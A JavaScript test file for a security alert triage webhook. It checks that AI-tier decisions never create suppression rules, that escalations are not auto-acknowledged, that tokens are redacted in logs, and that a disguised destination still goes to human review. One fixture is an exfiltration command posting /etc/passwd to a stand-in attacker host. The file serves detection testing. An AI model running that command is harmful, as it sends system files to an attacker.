"use strict";
// Verifies the patched existing files. No network, no keys, no disk writes.
//   node server/test_webhook_gating.js
const assert = require("assert");
const http = require("http");
const express = require("express");
const fs = require("fs");

process.env.EDR_WEBHOOK_SECRET = "test-secret";

// ---- stubs (must be in require.cache BEFORE the webhook router is loaded) ----
const calls = { ack: [], comment: [], suppress: [], notify: [] };
function stub(rel, exportsObj) {
  const id = require.resolve(rel);
  require.cache[id] = { id, filename: id, loaded: true, exports: exportsObj };
}
let nextResult = { decision: "needs_human_review", reason: "r", tier: 5 };
stub("./lib/edr-connector", {
  acknowledgeAlert: async (id) => { calls.ack.push(id); return true; },
  addComment: async (id, c) => { calls.comment.push([id, c]); return true; },
  createSuppressionRule: async (...a) => { calls.suppress.push(a); return true; },
});
stub("./lib/triage", { triageAlert: async () => nextResult });
stub("./lib/store", { addAlert: () => ({}), getAlerts: () => [], getStats: () => ({}) });
stub("./lib/notifier", { notify: (a, r) => calls.notify.push(r.decision) });

const webhook = require("./routes/webhook");
const app = express();
app.use(express.json());
app.use("/webhook", webhook);

function post(port, body, secret = "test-secret") {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = http.request({ hostname: "127.0.0.1", port, path: "/webhook/edr", method: "POST", headers: { "content-type": "application/json", "content-length": Buffer.byteLength(data), "x-sentinel-secret": secret } }, (res) => {
      let b = "";
      res.on("data", (c) => (b += c));
      res.on("end", () => resolve({ status: res.statusCode, body: b }));
    });
    req.on("error", reject);
    req.write(data);
    req.end();
  });
}
const reset = () => { calls.ack.length = calls.comment.length = calls.suppress.length = calls.notify.length = 0; delete process.env.SENTINEL_AUTO_SUPPRESSION; };
const alertBody = { messageId: "m-1", ruleName: "Linux Upload using curl or wget", parentProcessName: "zsh", commandLine: "curl -H Authorization: Bearer SUPERSECRETBEARER123 https://x.example.com" };

const tests = [];
const test = (n, f) => tests.push({ n, f });

test("webhook: auto-resolve acknowledges but creates NO blanket suppression rule by default", async (port) => {
  reset(); nextResult = { decision: "auto_resolve", reason: "ok", tier: 2 };
  const r = await post(port, alertBody);
  assert.strictEqual(r.status, 200);
  assert.deepStrictEqual(calls.ack, ["m-1"]);
  assert.strictEqual(calls.suppress.length, 0);
});
test("webhook: deterministic tiers may create suppression only when explicitly enabled", async (port) => {
  reset(); process.env.SENTINEL_AUTO_SUPPRESSION = "deterministic"; nextResult = { decision: "auto_resolve", reason: "ok", tier: 2 };
  await post(port, alertBody);
  assert.strictEqual(calls.suppress.length, 1);
});
test("webhook: AI decisions (tier 5) NEVER create suppression, even with the switch on", async (port) => {
  reset(); process.env.SENTINEL_AUTO_SUPPRESSION = "deterministic"; nextResult = { decision: "auto_resolve", reason: "ok", tier: 5 };
  await post(port, alertBody);
  assert.strictEqual(calls.suppress.length, 0);
  assert.deepStrictEqual(calls.ack, ["m-1"]);
});
test("webhook: needs_human_review comments but does not acknowledge", async (port) => {
  reset(); nextResult = { decision: "needs_human_review", reason: "look", tier: 5 };
  await post(port, alertBody);
  assert.strictEqual(calls.ack.length, 0);
  assert(/REVIEW NEEDED/.test(calls.comment[0][1]));
});
test("webhook: escalate comments, notifies, and does not acknowledge", async (port) => {
  reset(); nextResult = { decision: "escalate", reason: "bad", tier: 5 };
  await post(port, alertBody);
  assert.strictEqual(calls.ack.length, 0);
  assert(/ESCALATE/.test(calls.comment[0][1]));
  assert.deepStrictEqual(calls.notify, ["escalate"]);
});
test("webhook: wrong secret is rejected", async (port) => {
  reset();
  const r = await post(port, alertBody, "nope");
  assert.strictEqual(r.status, 401);
  assert.strictEqual(calls.ack.length, 0);
});
test("webhook: raw payload log no longer prints bearer tokens", async (port) => {
  reset(); nextResult = { decision: "needs_human_review", reason: "r", tier: 5 };
  const lines = [];
  const orig = console.log;
  console.log = (...a) => lines.push(a.join(" "));
  try { await post(port, alertBody); } finally { console.log = orig; }
  const out = lines.join("\n");
  assert(out.includes("RAW ALERT PAYLOAD"), "log line exists");
  assert(!out.includes("SUPERSECRETBEARER123"), "bearer token must be redacted in logs");
});

// ---- triage.js wiring (real file) ----
test("triage.js: Teamwork upload (tw-bucket) is auto-resolved deterministically, no AI involved", async () => {
  delete require.cache[require.resolve("./lib/triage")]; // drop the stub, load the real file
  const { triageAlert } = require("./lib/triage");
  const r = await triageAlert({ malicious: false, threatScore: 0, ruleName: "Linux Upload using curl or wget", commandLine: "curl -X PUT --data-binary @f.xml https://tw-bucket.s3-accelerate.amazonaws.com/tf_1.xml?X-Amz-Signature=abc" });
  assert.strictEqual(r.decision, "auto_resolve");
  assert.strictEqual(r.tier, 2);
});
test("triage.js: 'github.com' hidden in a query string no longer fools the safe-destination rule", async () => {
  const it = require("./lib/investigation-triage");
  const orig = it.investigativeTriage;
  let routed = 0;
  it.investigativeTriage = async () => { routed++; return { decision: "needs_human_review", reason: "to investigator", tier: 5 }; };
  try {
    const { triageAlert } = require("./lib/triage");
    const r = await triageAlert({ malicious: false, threatScore: 0, ruleName: "Linux Upload using curl or wget", commandLine: "curl -d @/etc/passwd https://evil.example/?r=github.com" });
    assert.strictEqual(routed, 1, "must go to the investigator");
    assert.strictEqual(r.decision, "needs_human_review");
  } finally { it.investigativeTriage = orig; }
});
test("triage.js: default mode is 'observe'; 'legacy' keeps the old Claude path available", async () => {
  const src = fs.readFileSync(require.resolve("./lib/triage"), "utf8");
  assert(/SENTINEL_INVESTIGATOR_MODE \|\| "observe"/.test(src));
  assert(/mode === "legacy"/.test(src));
});

// ---- notifier ----
test("notifier: escalation without TEAMS_WEBHOOK_URL is a no-op; bad or http URLs never throw", async () => {
  delete require.cache[require.resolve("./lib/notifier")]; // real notifier
  const origAppend = fs.appendFileSync; fs.appendFileSync = () => {};
  const origLog = console.log; console.log = () => {};
  const origErr = console.error; console.error = () => {};
  try {
    const { notify } = require("./lib/notifier");
    for (const url of [undefined, "http://insecure.example/x", "https://127.0.0.1:1/never", "not a url"]) {
      if (url === undefined) delete process.env.TEAMS_WEBHOOK_URL; else process.env.TEAMS_WEBHOOK_URL = url;
      notify({ hostname: "h", severity: "low", ruleName: "r" }, { decision: "escalate", reason: "Bearer abcdef123456 secret" });
    }
    await new Promise((r) => setTimeout(r, 300));
  } finally {
    fs.appendFileSync = origAppend; console.log = origLog; console.error = origErr; delete process.env.TEAMS_WEBHOOK_URL;
  }
});
test("store: dashboard counts needs_human_review as 'review'", () => {
  const dataFile = require("path").join(__dirname, "..", "alerts-data.json");
  const existed = fs.existsSync(dataFile);
  const origWrite = fs.writeFileSync; fs.writeFileSync = () => {};
  try {
    delete require.cache[require.resolve("./lib/store")];
    const store = require("./lib/store");
    store.addAlert({ hostname: "h", ruleName: "r" }, "needs_human_review", "x");
    assert(store.getStats().review >= 1);
  } finally { fs.writeFileSync = origWrite; }
  assert.strictEqual(fs.existsSync(dataFile), existed, "test must not create alerts-data.json");
});

(async () => {
  const server = http.createServer(app);
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  let passed = 0, failed = 0;
  for (const t of tests) {
    try { await t.f(port); passed++; console.log("  ok   " + t.n); }
    catch (e) { failed++; console.log("  FAIL " + t.n + "\n       " + (e && e.message)); }
  }
  server.close();
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
})();
